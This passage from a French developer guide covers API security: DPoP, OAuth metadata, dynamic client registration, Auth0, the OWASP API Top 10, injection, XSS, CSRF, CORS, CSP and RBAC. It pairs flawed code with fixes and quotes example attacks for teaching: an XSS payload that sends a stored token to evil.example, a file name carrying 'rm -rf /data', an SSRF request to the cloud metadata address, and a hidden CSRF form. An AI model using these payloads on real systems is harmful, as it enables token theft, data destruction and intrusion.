| ma SPA ou mon appli mobile garde des refresh tokens valables longtemps, donc un jeton volé dans le navigateur ou sur le téléphone resterait utilisable longtemps | oui : un refresh token volé devient inutile |
| un jeton volé sur mon API ferait des dégâts graves, comme une API de paiement ou de données de santé | oui |
| deux services se parlent sur un réseau interne avec des jetons qui expirent très vite, donc un jeton volé ne sert pas longtemps | moins prioritaire |
| mon client ne sait pas garder une clé privée à l'abri, par exemple un script qui la laisse en clair dans un fichier | l'intérêt diminue |

Le coût : le client doit gérer une clé et signer à chaque requête, et l'API doit vérifier une <span class="term" data-term="digital-signature">signature</span> de plus. Les bibliothèques récentes le font pour moi.

:material-book-open-variant: Doc de référence : [RFC 9449, OAuth 2.0 DPoP](https://www.rfc-editor.org/rfc/rfc9449) (2023)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | DPoP est connu, et une analyse a listé les API où un jeton volé ferait le plus de dégâts |
    | N2 | les clients publics qui gardent des refresh tokens longs utilisent DPoP, par une bibliothèque qui signe chaque requête |
    | N3 | les API sensibles refusent seules un jeton bearer ou une preuve DPoP rejouée (`jti` déjà vu, `iat` trop ancien) |
    | N4 | l'équipe suit les preuves refusées et les vols de jetons détectés, et étend DPoP aux API suivantes d'après ces chiffres |

    **Je mesure** : la part des appels aux API sensibles faits avec un jeton DPoP, lue dans les journaux de l'API ; le nombre de preuves refusées par jour, lu dans les métriques de vérification.

## Les métadonnées du serveur d'autorisation

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a>

### L'adresse qui décrit tout
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Un serveur d'autorisation publie à une adresse standard la liste de ses <span class="term" data-term="endpoint">points d'entrée</span> et de ce qu'il sait faire. Un client peut ainsi se configurer tout seul, à partir de la seule adresse du fournisseur.

| Adresse                                         | Norme                                   |
|-------------------------------------------------|-----------------------------------------|
| `/.well-known/openid-configuration`             | découverte OIDC                         |
| `/.well-known/oauth-authorization-server`       | métadonnées OAuth (RFC 8414, 2018)            |
| `/.well-known/oauth-protected-resource`         | métadonnées d'une API protégée (RFC 9728, 2025) : « pour m'appeler, va chercher un jeton chez tel serveur » |

```
$ curl -s https://my-tenant.eu.auth0.com/.well-known/openid-configuration | jq
{
  "issuer": "https://my-tenant.eu.auth0.com/",
  "authorization_endpoint": "https://my-tenant.eu.auth0.com/authorize",
  "token_endpoint": "https://my-tenant.eu.auth0.com/oauth/token",
  "jwks_uri": "https://my-tenant.eu.auth0.com/.well-known/jwks.json",
  "registration_endpoint": "https://my-tenant.eu.auth0.com/oidc/register",
  "code_challenge_methods_supported": ["S256", "plain"],
  ...
}
```
Les valeurs exactes dépendent du fournisseur et de sa configuration. `registration_endpoint` n'apparaît que si l'<span class="term" data-term="dcr">enregistrement dynamique</span> est activé.

C'est ce que font les connecteurs <span class="term" data-term="mcp">MCP</span> des assistants IA : l'API répond `401` avec l'adresse de ses métadonnées, le client les lit, trouve le serveur d'autorisation, et lance la connexion sans aucune configuration manuelle.

```mermaid
sequenceDiagram
  participant C as Client
  participant API as orders-api
  participant AS as Serveur d'autorisation
  C->>API: GET /orders sans jeton
  API-->>C: 401, WWW-Authenticate avec resource_metadata
  C->>API: GET /.well-known/oauth-protected-resource
  API-->>C: authorization_servers, l'adresse du serveur
  C->>AS: GET /.well-known/oauth-authorization-server
  AS-->>C: authorization_endpoint, token_endpoint
  Note over C,AS: le client lance Authorization Code + PKCE, sans configuration manuelle
```

**Risques.** Un client qui fait confiance à n'importe quelles métadonnées peut être envoyé vers un faux serveur d'autorisation : je vérifie que le champ `issuer` correspond exactement à l'adresse attendue, et que les métadonnées arrivent en HTTPS. Mettre en cache les clés de `jwks_uri` sans jamais les recharger fait refuser tous les jetons le jour où le fournisseur change de clé.

:material-book-open-variant: Doc de référence : [RFC 8414, OAuth 2.0 Authorization Server Metadata](https://www.rfc-editor.org/rfc/rfc8414) (2018) ; [RFC 9728, OAuth 2.0 Protected Resource Metadata](https://www.rfc-editor.org/rfc/rfc9728) (2025)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | chaque client recopie à la main les adresses du fournisseur et sa clé publique |
    | N2 | les clients et les API lisent `/.well-known/...` au démarrage et récupèrent les clés par `jwks_uri` |
    | N3 | les API rechargent seules les clés quand un `kid` inconnu arrive, donc une rotation de clé chez le fournisseur ne coupe aucun service |
    | N4 | l'équipe suit les erreurs de validation dues à une clé inconnue pendant les rotations, et ajuste la durée de cache des clés d'après ces chiffres |

    **Je mesure** : le nombre de configurations qui contiennent une clé publique ou une adresse de fournisseur en dur, compté dans les dépôts ; le pic de `401` pendant la dernière rotation de clé, lu dans les métriques de l'API.

## Enregistrement dynamique des clients (DCR)

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a>

### Ce que c'est
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Normalement, un administrateur crée chaque application cliente à la main dans le fournisseur d'identité, et obtient son `client_id`. Avec le **Dynamic Client Registration** (RFC 7591 de 2015, repris par OIDC), une application s'enregistre **toute seule** en appelant une adresse :

!!! noob "As noob"
    C'est une salle de sport où chacun s'inscrit seul à la borne au lieu de passer par l'accueil : pratique, mais sans contrôle, n'importe qui peut se créer cent badges. La phrase à retenir : **l'enregistrement dynamique facilite l'arrivée de nouveaux clients, au prix d'un guichet ouvert à tous qu'il faut encadrer.**

```
POST /oidc/register
{
  "client_name": "Mon outil de reporting",
  "redirect_uris": ["https://reporting.example.com/callback"]
}

201 Created
{"client_id": "k8Fj3...", "client_name": "Mon outil de reporting"}
```
Utile quand des milliers de clients inconnus à l'avance doivent se connecter, par exemple les assistants IA qui se branchent sur des serveurs <span class="term" data-term="mcp">MCP</span>.

:material-book-open-variant: Doc de référence : [RFC 7591, OAuth 2.0 Dynamic Client Registration](https://www.rfc-editor.org/rfc/rfc7591) (2015)
{ .doc-ref }

### Pourquoi c'est un souci
L'adresse d'enregistrement est **publiée dans les métadonnées**, donc connue de tout le monde. Si elle est ouverte sans contrôle, **n'importe qui peut créer une application** chez le fournisseur d'identité.

Scénario d'attaque concret :
```
1. l'attaquant lit registration_endpoint dans /.well-known/openid-configuration
2. il enregistre une appli nommée « Outil RH officiel », avec SA propre adresse de retour
3. il envoie à ada un lien de connexion vers la VRAIE page de connexion de l'entreprise
4. ada voit le bon domaine, le bon logo, et accepte
5. le code part vers l'adresse de l'attaquant, qui obtient un jeton au nom d'ada
```
D'autres risques : des milliers de clients parasites créés en masse, et des champs comme `logo_uri` ou `jwks_uri` qui font que le serveur va lui-même appeler des adresses choisies par l'attaquant (<span class="term" data-term="ssrf">SSRF</span>, quand on fait faire au serveur des requêtes vers des adresses internes).

### Les parades

| Parade                                                   | Effet                                                       |
|----------------------------------------------------------|-------------------------------------------------------------|
| désactiver le DCR si on n'en a pas besoin                | le cas le plus fréquent : supprime le risque                |
| exiger un jeton d'enregistrement initial                 | seuls les clients à qui on l'a donné peuvent s'enregistrer  |
| marquer les clients enregistrés comme « tiers »          | écran de consentement obligatoire, droits limités           |
| limiter les <span class="term" data-term="oauth-scope">scopes</span> accordés aux clients dynamiques       | un client inconnu ne peut pas obtenir de droits d'admin     |
| afficher clairement le domaine du client sur l'écran de consentement | l'utilisateur voit que l'appli n'est pas celle qu'il croit |
| passer aux **Client ID Metadata Documents** (CIMD)       | voir ci-dessous                                             |

### L'alternative : Client ID Metadata Documents
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Au lieu de s'enregistrer, le client publie sa propre fiche sur **son** domaine, et son `client_id` **est** l'adresse de cette fiche :
```
client_id = https://reporting.example.com/oauth-client.json
```
Le serveur d'autorisation télécharge la fiche et vérifie que l'adresse de retour demandée y figure. Il n'y a plus d'adresse d'enregistrement ouverte, et un `client_id` prouve au minimum qu'on contrôle le domaine. C'est la méthode que la spécification MCP recommande désormais (révision de juillet 2026), le DCR restant possible pour la compatibilité.

**Risques.** Le serveur télécharge la fiche à une adresse choisie par le client : sans garde-fou, c'est une porte vers le SSRF (une fiche « hébergée » sur une adresse interne). Je limite les adresses acceptées à HTTPS sur des domaines publics, avec un délai et une taille maximale. Et un domaine expiré puis racheté donne le `client_id` à son nouveau propriétaire.

:material-book-open-variant: Doc de référence : [IETF, OAuth Client ID Metadata Document](https://datatracker.ietf.org/doc/draft-ietf-oauth-client-id-metadata-document/) (brouillon, consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | l'équipe sait si le DCR est actif sur son tenant, et pourquoi |
    | N2 | le DCR est désactivé partout où il ne sert pas ; ailleurs, il exige un jeton d'enregistrement ou cède la place aux CIMD |
    | N3 | les clients enregistrés dynamiquement reçoivent seuls des scopes limités et un écran de consentement, et une alerte se déclenche sur un pic d'enregistrements |
    | N4 | l'équipe suit les clients dynamiques créés, utilisés et jamais utilisés, et purge ou durcit les règles d'après ces chiffres |

    **Je mesure** : le nombre de clients créés par enregistrement dynamique dans le mois, lu dans les journaux du fournisseur ; la part de ces clients sans aucune connexion depuis 30 jours.

## Auth0

<a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a>

### Auth0 ou OAuth : la différence

*Auth0 : concurrent de Keycloak, Okta*
{ .tool-rel }

- **OAuth 2.0 / 2.1** et **OIDC** sont des **protocoles** : des règles écrites, publiques, que n'importe qui peut implémenter.
- **Auth0** est un **produit** (de la société Okta) : un <span class="term" data-term="identity-provider">fournisseur d'identité</span> en ligne qui **implémente** ces protocoles, et ajoute ce dont une entreprise a besoin autour : la gestion des utilisateurs, la connexion via Google ou l'annuaire de l'entreprise, la <span class="term" data-term="mfa">MFA</span>, les écrans de connexion, les journaux, les règles personnalisées.

Comparaison : OAuth est au fournisseur d'identité ce que HTTP est à un serveur web. Auth0, Okta, Keycloak (open source) ou Microsoft Entra ID sont des implémentations.

*Keycloak : concurrent de Auth0, Okta*
{ .tool-rel }


**Risques.** Un fournisseur d'identité hébergé est un point central : s'il tombe, plus personne ne se connecte, et ses quotas ou son prix peuvent changer. En m'appuyant sur les règles et les actions propres au produit, je m'enferme : je m'en tiens autant que possible aux protocoles standard (OIDC, OAuth), qui gardent un changement de fournisseur possible.

:material-book-open-variant: Doc de référence : [Auth0, OAuth 2.0 Authorization Framework](https://auth0.com/docs/authenticate/protocols/oauth) (consultée en novembre 2026)
{ .doc-ref }

### Les concepts d'Auth0
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

| Concept         | Ce que c'est                                                        | Exemple                                       |
|-----------------|---------------------------------------------------------------------|-----------------------------------------------|
| tenant          | un espace Auth0 isolé, avec son domaine                             | `my-tenant.eu.auth0.com`, un par environnement |
| application     | un client OAuth (SPA, web, natif, machine to machine)               | « Site client », « Batch reporting »          |
| API             | une API protégée, identifiée par son <span class="term" data-term="token-audience">audience</span>                       | audience `https://orders-api.example.com`     |
| permission      | un scope défini sur une API                                         | `read:orders`, `write:orders`                 |
| connection      | une source d'utilisateurs                                           | base Auth0, Google, annuaire d'entreprise     |
| action          | du code exécuté à un moment du parcours                             | ajouter le rôle de l'utilisateur dans le jeton à la connexion |
| organization    | un groupe d'utilisateurs, pour un produit vendu à des entreprises   | une organisation par client B2B               |

**Risques.** Une action s'exécute à chaque connexion : si elle appelle un service lent ou en panne, plus personne ne se connecte. Des changements faits à la main dans la console font diverger les tenants : celui de test de Malik a une permission que la production n'a pas, et un test passe alors que le même appel échouerait en production. Je garde les actions courtes, avec un délai maximal et un comportement prévu en cas d'échec, et je versionne la configuration du tenant pour l'appliquer par la CI.

:material-book-open-variant: Doc de référence : [Auth0, Auth0 Overview](https://auth0.com/docs/get-started/auth0-overview) (consultée en novembre 2026)
{ .doc-ref }

### Le rôle de l'audience
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Dans Auth0, la demande de jeton précise l'API visée avec `audience`. Le jeton reçu porte cette audience dans `aud`, et l'API refuse un jeton fait pour une autre API.

!!! noob "As noob"
    Un billet de concert porte le nom de la salle : même authentique, il ne fait pas entrer dans la salle d'à côté. L'audience `aud` est ce nom de salle : un jeton fait pour l'API de facturation est refusé par l'API des commandes. La phrase à retenir : **un jeton valide ne suffit pas, il doit être fait pour mon API.**

```
jeton demandé avec audience = https://orders-api.example.com
appel à orders-api    : accepté
appel à billing-api   : refusé (aud ne correspond pas)
```
Sans `audience`, Auth0 peut renvoyer un jeton qui n'est pas un JWT exploitable par mon API : c'est une cause fréquente de « mon jeton est refusé ».

**Risques.** Une seule audience partagée par toutes les API annule la protection : un jeton volé sur l'outil de statistiques ouvre aussi l'API de facturation. Une API qui ne vérifie pas `aud` accepte, elle, n'importe quel jeton signé par le même tenant. Je donne une audience par API, comme `https://orders-api.example.com` et `https://billing-api.example.com`, et un test de refus envoie à chaque API un jeton fait pour une autre.

:material-book-open-variant: Doc de référence : [Auth0, Access Tokens](https://auth0.com/docs/secure/tokens/access-tokens) (consultée en novembre 2026)
{ .doc-ref }

### Auth0 et OAuth 2.1
Auth0 permet d'appliquer les règles d'OAuth 2.1 : Authorization Code + <span class="term" data-term="pkce">PKCE</span> pour les SPA et les applis mobiles, rotation des refresh tokens, adresses de retour exactes. Le flux Password existe encore pour la compatibilité, mais il faut le désactiver sur les applications qui n'en ont pas besoin. Le DCR est désactivé par défaut et s'active au niveau du <span class="term" data-term="tenant">tenant</span>. Le support de <span class="term" data-term="dpop">DPoP</span> et des <span class="term" data-term="cimd">CIMD</span> dépend de la version et du plan : à vérifier dans la documentation Auth0 avant de s'y fier.

### Pièges fréquents avec Auth0, côté tests

| Piège                                                        | Conséquence                                        | Parade                                         |
|--------------------------------------------------------------|----------------------------------------------------|------------------------------------------------|
| demander un jeton machine to machine à chaque test           | quota mensuel de jetons M2M consommé, puis refus   | demander un jeton une fois et le réutiliser jusqu'à expiration |
| se connecter par l'écran de login dans chaque test E2E       | lent, et la MFA ou la limite de tentatives bloque les tests parallèles | se connecter une fois, sauvegarder la session, la réutiliser |
| plusieurs tests en parallèle sur un compte avec MFA          | « Too many attempts », tests instables             | un compte de test par worker, ou connexion par API |
| oublier `audience`                                           | jeton refusé par l'API                             | toujours préciser l'audience                   |
| contourner l'authentification dans les tests d'intégration   | on ne teste jamais les refus (jeton expiré, mauvais droits) | un vrai émetteur de jetons de test qui signe, et des tests de refus |
| le même tenant pour la prod et les tests                     | un test peut créer ou bloquer de vrais comptes     | un tenant par environnement                    |

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | un seul tenant sert à tout, et les tests se connectent par l'écran de login |
    | N2 | un tenant par environnement, la configuration du tenant versionnée dans un dépôt, et les jetons de test réutilisés jusqu'à expiration |
    | N3 | la CI applique seule la configuration du tenant, et un changement fait à la main dans la console est détecté et signalé |
    | N4 | l'équipe suit la consommation du quota de jetons machine et les échecs de connexion des tests, et ajuste le cache des jetons et les comptes de test d'après ces chiffres |

    **Je mesure** : le nombre de jetons machine demandés par jour rapporté au quota, lu dans le tableau de bord d'Auth0 ; le nombre de changements faits dans la console hors CI, lu dans les journaux du tenant.

## Les failles les plus courantes des API

<a class="pill pill-scope pill-scope-code" href="../architecture/#carte-des-echelles">Échelle · Code</a> <a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a>

La référence est l'**OWASP API Security Top 10** (édition 2023), une liste des risques les plus fréquents, publiée par une fondation spécialisée. Les plus utiles à connaître, avec leur test :

| Faille                                    | Exemple                                                   | Test à écrire                                       |
|-------------------------------------------|-----------------------------------------------------------|-----------------------------------------------------|
| **BOLA** (accès aux objets d'un autre)    | ada change `/orders/42` en `/orders/43` et voit la commande de grace | ada demande la commande de grace : `403` ou `404` attendu |
| authentification cassée                   | un jeton expiré ou mal signé est accepté                  | jeton expiré, mauvaise audience, signature modifiée : `401` |
| exposition excessive de propriétés        | la réponse contient `password_hash` ou des champs internes | vérifier que la réponse ne contient que les champs du contrat |
| absence de limite                         | 10 000 requêtes par seconde acceptées, ou `?limit=1000000` | au-delà du seuil : `429` ; `limit` plafonné         |
| fonctions d'admin accessibles             | un utilisateur normal appelle `DELETE /admin/users/7`     | utilisateur sans rôle admin : `403`                 |
| <span class="term" data-term="ssrf">SSRF</span>                                      | `POST /import {"url": "http://169.254.169.254/"}` lit les secrets du serveur | une URL interne est refusée                        |

Le BOLA est le premier de la liste : c'est aussi le plus simple à tester, et souvent oublié.

!!! noob "As noob"
    Au vestiaire, mon ticket porte le numéro 42. Si le préposé rend le manteau de quiconque annonce un numéro, il suffit de dire « 43 » pour repartir avec celui du voisin. Le BOLA, c'est ce préposé : il vérifie que j'ai un ticket, pas que c'est le mien. La phrase à retenir : **être connecté ne donne pas le droit de lire tous les objets, je vérifie à qui appartient chacun.**

Le code fautif a l'air correct, parce qu'il vérifie bien le jeton :

```python
# À éviter : le jeton est vérifié, mais pas le propriétaire, ada lit la commande 43 de grace
@app.get("/orders/{order_id}")
def get_order(order_id: int, user: User = Depends(current_user)):
    return orders_repo.get(order_id)

# Bien : la commande est cherchée parmi celles de l'utilisateur, sinon 404
@app.get("/orders/{order_id}")
def get_order(order_id: int, user: User = Depends(current_user)):
    order = orders_repo.get_for_owner(order_id, owner_id=user.id)
    if order is None:
        raise HTTPException(status_code=404)
    return order
```

:material-book-open-variant: Doc de référence : [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) (édition 2023)
{ .doc-ref }

### Injection
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Je construis une requête (SQL, commande système) en collant du texte tapé par l'utilisateur, comme le nom de client qu'il recherche : il peut alors glisser ses propres ordres dans la requête, par exemple pour lire toute la table. Détails et parade dans la page [SQL](sql.md#securite-linjection-sql) : toujours des <span class="term" data-term="parameterized-query">requêtes paramétrées</span>.

Le même piège existe avec une commande système. Ici, l'utilisateur fournit le nom d'un fichier à compresser ; s'il envoie `rapport.csv; rm -rf /data`, le shell exécute les deux commandes :

```python
# À éviter : la saisie passe par le shell, le ; enchaîne une seconde commande
subprocess.run(f"gzip {filename}", shell=True)

# Bien : liste d'arguments sans shell, la saisie reste un seul nom de fichier
subprocess.run(["gzip", "--", filename], check=True)
```

:material-book-open-variant: Doc de référence : [OWASP, SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) (consultée en novembre 2026)
{ .doc-ref }

### XSS, CSRF, CORS : les failles côté navigateur
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

| Sigle | Ce que c'est                                                                 | Parade                                                   |
|-------|------------------------------------------------------------------------------|----------------------------------------------------------|
| XSS   | du JavaScript de l'attaquant s'exécute dans la page d'un autre utilisateur (un commentaire contenant `<script>`) | échapper l'affichage, ne jamais insérer du HTML brut, en-tête Content-Security-Policy |
| <span class="term" data-term="csrf">CSRF</span>  | un autre site fait envoyer une requête par le navigateur de la victime, avec ses <span class="term" data-term="cookie">cookies</span> | cookies `SameSite`, jeton anti-CSRF dans les formulaires |
| <span class="term" data-term="cors">CORS</span>  | la règle qui dit quels autres sites ont le droit d'appeler mon API depuis un navigateur | lister les origines autorisées, jamais `*` avec des cookies |

Le XSS le plus courant vient d'un affichage qui insère du texte comme du HTML. Un visiteur poste le commentaire `<img src=x onerror="fetch('https://evil.example/?t='+localStorage.getItem('token'))">` ; chaque personne qui affiche la page envoie son jeton à l'attaquant.

!!! noob "As noob"
    C'est un panneau d'affichage où chacun colle sa petite annonce. Si le panneau exécute les instructions écrites sur les annonces au lieu de les afficher, une annonce « donnez vos clés au porteur de ce message » devient un ordre pour tous les passants. La phrase à retenir : **ce que tape un utilisateur s'affiche comme du texte, jamais comme du code.**

```javascript
// À éviter : le commentaire est interprété comme du HTML, son attribut onerror s'exécute
commentEl.innerHTML = comment.body;

// Bien : le commentaire est affiché comme du texte, les balises restent visibles et inertes
commentEl.textContent = comment.body;
```

:material-book-open-variant: Doc de référence : [OWASP, Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) (consultée en novembre 2026)
{ .doc-ref }

### L'origine
Une **origine** est le trio schéma + hôte + port d'une adresse. Le navigateur isole les origines entre elles : c'est la base de CSRF, CORS et <span class="term" data-term="samesite">SameSite</span>.
```
https://app.example.com:443/orders     origine de référence
https://app.example.com/profile        même origine (le chemin ne compte pas, 443 est le port par défaut)
http://app.example.com                 autre origine (schéma différent)
https://api.example.com                autre origine (hôte différent)
https://app.example.com:8443           autre origine (port différent)
```

:material-book-open-variant: Doc de référence : [RFC 6454, The Web Origin Concept](https://www.rfc-editor.org/rfc/rfc6454) (2011) ; [MDN, Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (consultée en novembre 2026)
{ .doc-ref }

### CSRF et cookies SameSite
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le CSRF (Cross-Site Request Forgery, falsification de requête intersite) en trois temps :
```
1. ada est connectée à orders-api.example.com, son navigateur garde le cookie session=abc
2. ada ouvre evil.example, qui contient un formulaire caché :
   <form action="https://orders-api.example.com/orders/42/cancel" method="POST"></form>
   et le soumet automatiquement en JavaScript
3. le navigateur envoie la requête AVEC le cookie session=abc : orders-api croit que c'est ada et annule la commande
```

!!! noob "As noob"
    Mon navigateur est comme un employé qui porte mon badge en permanence : un site malveillant lui tend un formulaire, il le dépose à la banque, et la banque voit mon badge et l'accepte. Le navigateur ne fait pas de différence entre un clic de ma part et une demande glissée par un autre site. La phrase à retenir : **le CSRF ne vole pas mon cookie, il fait agir mon navigateur à ma place.**

La parade principale est l'attribut `SameSite` du cookie, qui dit au navigateur de ne pas joindre le cookie aux requêtes venues d'un autre site :
```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/
```

| Attribut        | Effet                                                                 |
|-----------------|-----------------------------------------------------------------------|
| `HttpOnly`      | le JavaScript de la page ne peut pas lire le cookie (limite le vol par XSS) |
| `Secure`        | le cookie ne part qu'en HTTPS                                         |
| `SameSite=Lax`  | pas de cookie sur un `POST` venu d'un autre site ; envoyé sur un simple lien cliqué (`GET`) |
| `SameSite=Strict` | jamais de cookie depuis un autre site, même sur un lien            |
| `SameSite=None` | toujours envoyé (exige `Secure`) : à réserver aux vrais besoins intersites |

Une API appelée uniquement avec `Authorization: Bearer ...` n'est pas exposée au CSRF : le navigateur n'ajoute pas cet en-tête tout seul.

**Risques.** `SameSite=Lax` laisse passer le cookie sur un lien cliqué : une route qui modifie quelque chose en `GET`, comme `GET /orders/42/cancel`, reste attaquable, donc je garde les modifications en `POST`, `PUT` ou `DELETE`. Et `SameSite` ne protège pas entre sous-domaines d'un même site : un sous-domaine compromis peut envoyer des requêtes avec le cookie.

:material-book-open-variant: Doc de référence : [OWASP, CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) (consultée en novembre 2026) ; [MDN, Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) (consultée en novembre 2026)
{ .doc-ref }

### CORS : la requête de pré-vérification
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Par défaut, le JavaScript de `https://app.example.com` ne peut pas lire la réponse d'un appel vers `https://orders-api.example.com` (autre origine). **CORS** (Cross-Origin Resource Sharing) permet à l'API de dire quelles origines elle accepte. Pour une requête « non simple » (méthode `PUT` ou `DELETE`, en-tête `Authorization`, corps JSON), le navigateur envoie d'abord une requête `OPTIONS` de **pré-vérification** (preflight) :
```
OPTIONS /orders/42 HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Max-Age: 600
```
Si l'origine n'est pas dans la réponse, le navigateur n'envoie pas le `DELETE`. CORS protège les utilisateurs d'un navigateur, pas l'API : `curl` l'ignore complètement, l'autorisation côté serveur reste indispensable.

!!! noob "As noob"
    CORS est un vigile placé dans le navigateur, pas devant l'API : avant de laisser une page parler à une autre origine, il demande à l'API « acceptes-tu les visiteurs venant de ce site ? ». Quelqu'un qui passe par une autre porte (`curl`, un script) ne croise jamais ce vigile. La phrase à retenir : **CORS protège l'utilisateur d'un navigateur, la sécurité de l'API reste côté serveur.**

Côté serveur, l'erreur courante est d'ouvrir CORS à tout le monde pour faire taire une erreur en développement, en gardant les cookies. Certains frameworks renvoient alors l'origine de l'appelant telle quelle, et n'importe quel site peut lire les réponses de l'API avec la session de l'utilisateur :

```python
# À éviter : toutes les origines, avec les cookies
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)

# Bien : la liste des fronts connus, et seulement les méthodes utiles
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "DELETE"],
)
```

:material-book-open-variant: Doc de référence : [WHATWG, Fetch Standard, CORS protocol](https://fetch.spec.whatwg.org/#http-cors-protocol) (consultée en novembre 2026) ; [MDN, CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (consultée en novembre 2026)
{ .doc-ref }

### Content-Security-Policy
<span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

L'en-tête **Content-Security-Policy** (<span class="term" data-term="csp">CSP</span>) dit au navigateur d'où la page a le droit de charger du code. Un script injecté par XSS depuis un autre domaine, ou écrit en ligne dans la page, est alors bloqué :
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; frame-ancestors 'none'
```
Ici : tout vient de la <span class="term" data-term="same-origin">même origine</span> par défaut, les scripts aussi depuis `cdn.example.com`, aucun plugin, et la page ne peut pas être affichée dans une iframe d'un autre site. Astuce : commencer par `Content-Security-Policy-Report-Only` pour voir ce qui casserait sans rien bloquer.

**Risques.** Une CSP trop stricte posée d'un coup casse des pages en production (un script de mesure d'audience, une police externe) ; une CSP qui autorise `'unsafe-inline'` pour faire taire ces erreurs ne bloque plus le XSS le plus courant. Je passe par `Report-Only`, je lis les rapports, puis j'applique.

:material-book-open-variant: Doc de référence : [W3C, Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) (consultée en novembre 2026) ; [MDN, CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) (consultée en novembre 2026)
{ .doc-ref }

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | les failles de l'OWASP API Top 10 sont connues, et quelqu'un teste le BOLA à la main avant une mise en production |
    | N2 | chaque route a ses tests de refus (autre utilisateur, jeton expiré, rôle insuffisant), et un DAST tourne sur l'environnement d'intégration |
    | N3 | une route sans test de refus ou un test de refus rouge bloque seul la MR, et la passerelle applique les limites de débit |
    | N4 | l'équipe suit les failles trouvées par catégorie OWASP et leur délai de correction, et vise ses tests sur les catégories qui reviennent |

    **Je mesure** : la part des routes avec un test BOLA, comptée en croisant le contrat OpenAPI et les tests ; le délai médian de correction d'une faille trouvée, lu dans l'outil de suivi.

## Modéliser les droits : RBAC, ABAC, ReBAC

<a class="pill pill-scope pill-scope-code" href="../architecture/#carte-des-echelles">Échelle · Code</a> <a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <a class="pill pill-scope pill-scope-system" href="../architecture/#carte-des-echelles">Échelle · Système</a>

L'<span class="term" data-term="authorization">autorisation</span> répond à « ada a-t-elle le droit de rembourser la commande 42 ? ». Avec deux types d'utilisateurs, un `if` suffit. Avec un back-office, des agents de support par pays, des managers et des clients qui partagent des documents, il faut un modèle. Trois modèles se complètent : par rôles, par attributs, par relations.

### RBAC : des rôles
<a class="pill pill-scope pill-scope-code" href="../architecture/#carte-des-echelles">Échelle · Code</a> <a class="pill pill-scope pill-scope-app" href="../architecture/#carte-des-echelles">Échelle · Application</a> <span class="pill pill-status pill-status-ok" title="Toujours valable, vérifié en novembre 2026">Valable · 11/2026</span>

Le **<span class="term" data-term="rbac">RBAC</span>** (*Role-Based Access Control*) attache les permissions à des rôles, et les rôles aux personnes : le rôle `support` peut `orders:read` et `orders:refund`, ada a le rôle `support`. Le modèle a été formalisé par David Ferraiolo et Richard Kuhn au NIST (1992), puis normalisé (ANSI INCITS 359, 2004).

```python
# À éviter : des noms de rôles testés partout dans le code, ajouter un rôle oblige à relire chaque route
if user.role == "admin" or user.role == "manager":
    refund(order)

# Bien : le code teste une permission, la table rôle vers permissions vit à un seul endroit
ROLE_PERMISSIONS = {
    "support": {"orders:read", "orders:refund"},
    "manager": {"orders:read", "orders:refund", "orders:cancel"},
}


def can(user, permission):
    return any(permission in ROLE_PERMISSIONS.get(role, set()) for role in user.roles)
```

